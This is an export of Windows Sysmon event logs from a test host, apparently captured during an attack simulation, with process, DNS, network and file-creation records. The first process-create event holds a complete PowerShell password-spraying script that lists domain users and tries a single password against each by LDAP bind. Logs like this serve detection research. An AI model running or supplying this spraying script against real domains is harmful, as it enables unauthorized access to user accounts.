Write-Host \""""End of password spraying\""""}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1688</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:53:30.065

ProcessGuid: {f57bd86a-8eca-658c-c901-000000000f00}

ProcessId: 3088

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {if (\""""NTLM\"""".ToLower() -NotIn @(\""""ntlm\"""",\""""kerberos\"""")) {
  Write-Host \""""Only 'NTLM' and 'Kerberos' auth methods are supported\""""
  exit 1
}

$DomainUsers = Get-ADUser -LDAPFilter '(&amp;(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName

[System.Reflection.Assembly]::LoadWithPartialName(\""""System.DirectoryServices.Protocols\"""") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\""""$env:UserDnsDomain\"""",389)

$DomainUsers | Foreach-Object {
  $user = $_
  $password = 'P@ssw0rd!'

  $credz = new-object System.Net.NetworkCredential($user, $password, \""""$env:UserDnsDomain\"""")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
  try {
    Write-Host \"""" [-] Attempting ${password} on account ${user}.\""""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] ${user}:${password} are valid credentials!\""""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host \""""End of password spraying\""""}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 1688

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19578,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:28.670

ProcessGuid: {f57bd86a-8ead-658c-c601-000000000f00}

ProcessId: 1064

QueryName: _ldap._tcp.dc._msdcs.WINDEV2309EVAL

QueryStatus: 9003

QueryResults: -

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8ead-658c-c601-000000000f00},3588,1064,,,_ldap._tcp.dc._msdcs.WINDEV2309EVAL,-,9003,"
      ",-,,,,,,2023-12-27T20:53:27.2432258Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:28.670,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:53:27.2432258Z""/>
      <EventRecordID>19578</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:28.670</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8ead-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">1064</Data>
      <Data Name=""QueryName"">_ldap._tcp.dc._msdcs.WINDEV2309EVAL</Data>
      <Data Name=""QueryStatus"">9003</Data>
      <Data Name=""QueryResults"">-</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:28.670

ProcessGuid: {f57bd86a-8ead-658c-c601-000000000f00}

ProcessId: 1064

QueryName: _ldap._tcp.dc._msdcs.WINDEV2309EVAL

QueryStatus: 9003

QueryResults: -

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19577,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:13.488

ProcessGuid: {f57bd86a-8ead-658c-c601-000000000f00}

ProcessId: 1064

QueryName: _ldap._tcp.dc._msdcs.WINDEV2309EVAL

QueryStatus: 9003

QueryResults: -

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8ead-658c-c601-000000000f00},3588,1064,,,_ldap._tcp.dc._msdcs.WINDEV2309EVAL,-,9003,"
      ",-,,,,,,2023-12-27T20:53:11.0573306Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:13.488,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:53:11.0573306Z""/>
      <EventRecordID>19577</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:13.488</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8ead-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">1064</Data>
      <Data Name=""QueryName"">_ldap._tcp.dc._msdcs.WINDEV2309EVAL</Data>
      <Data Name=""QueryStatus"">9003</Data>
      <Data Name=""QueryResults"">-</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:13.488

ProcessGuid: {f57bd86a-8ead-658c-c601-000000000f00}

ProcessId: 1064

QueryName: _ldap._tcp.dc._msdcs.WINDEV2309EVAL

QueryStatus: 9003

QueryResults: -

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,22,19576,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:06.366

ProcessGuid: {f57bd86a-8ead-658c-c601-000000000f00}

ProcessId: 1064

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8ead-658c-c601-000000000f00},3588,1064,,,raw.githubusercontent.com,::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;,0,"
      ",-,,,,,,2023-12-27T20:53:04.8608445Z,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:06.366,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:53:04.8608445Z""/>
      <EventRecordID>19576</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:06.366</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8ead-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">1064</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:06.366

ProcessGuid: {f57bd86a-8ead-658c-c601-000000000f00}

ProcessId: 1064

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.110.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.111.133;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,cdn-185-199-110-133.github.com,185.199.110.133,false,443,https,3,19575,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,true,,0x8000000000000000,Information,,,"Network connection detected:

RuleName: -

UtcTime: 2023-12-27 14:52:06.385

ProcessGuid: {f57bd86a-8ead-658c-c601-000000000f00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.163

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 50091

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 185.199.110.133

DestinationHostname: cdn-185-199-110-133.github.com

DestinationPort: 443

DestinationPortName: https",Info,,,,,,,{f57bd86a-8ead-658c-c601-000000000f00},3588,1064,,tcp,,,,"
      ",-,WinDev2309Eval.localdomain,192.168.126.163,false,50091,-,2023-12-27T20:53:03.9964243Z,,Network connection detected (rule: NetworkConnect),,5136,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:06.385,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:53:03.9964243Z""/>
      <EventRecordID>19575</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5136""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:06.385</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8ead-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">1064</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""Protocol"">tcp</Data>
      <Data Name=""Initiated"">true</Data>
      <Data Name=""SourceIsIpv6"">false</Data>
      <Data Name=""SourceIp"">192.168.126.163</Data>
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      <Data Name=""SourcePort"">50091</Data>
      <Data Name=""SourcePortName"">-</Data>
      <Data Name=""DestinationIsIpv6"">false</Data>
      <Data Name=""DestinationIp"">185.199.110.133</Data>
      <Data Name=""DestinationHostname"">cdn-185-199-110-133.github.com</Data>
      <Data Name=""DestinationPort"">443</Data>
      <Data Name=""DestinationPortName"">https</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Network connection detected:

RuleName: -

UtcTime: 2023-12-27 14:52:06.385

ProcessGuid: {f57bd86a-8ead-658c-c601-000000000f00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User

Protocol: tcp

Initiated: true

SourceIsIpv6: false

SourceIp: 192.168.126.163

SourceHostname: WinDev2309Eval.localdomain

SourcePort: 50091

SourcePortName: -

DestinationIsIpv6: false

DestinationIp: 185.199.110.133

DestinationHostname: cdn-185-199-110-133.github.com

DestinationPort: 443

DestinationPortName: https</Message>
      <Level>Information</Level>
      <Task>Network connection detected (rule: NetworkConnect)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:53:01.311,,,,,,,,11,19574,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 20:53:01.311

ProcessGuid: {f57bd86a-8ead-658c-c601-000000000f00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wbonnvze.yn1.ps1

CreationUtcTime: 2023-12-27 20:53:01.311

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8ead-658c-c601-000000000f00},3588,1064,,,,,,"
      ",-,,,,,,2023-12-27T20:53:01.3152385Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wbonnvze.yn1.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:53:01.311,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:53:01.3152385Z""/>
      <EventRecordID>19574</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:53:01.311</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8ead-658c-c601-000000000f00}</Data>
      <Data Name=""ProcessId"">1064</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wbonnvze.yn1.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:53:01.311</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 20:53:01.311

ProcessGuid: {f57bd86a-8ead-658c-c601-000000000f00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wbonnvze.yn1.ps1

CreationUtcTime: 2023-12-27 20:53:01.311

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
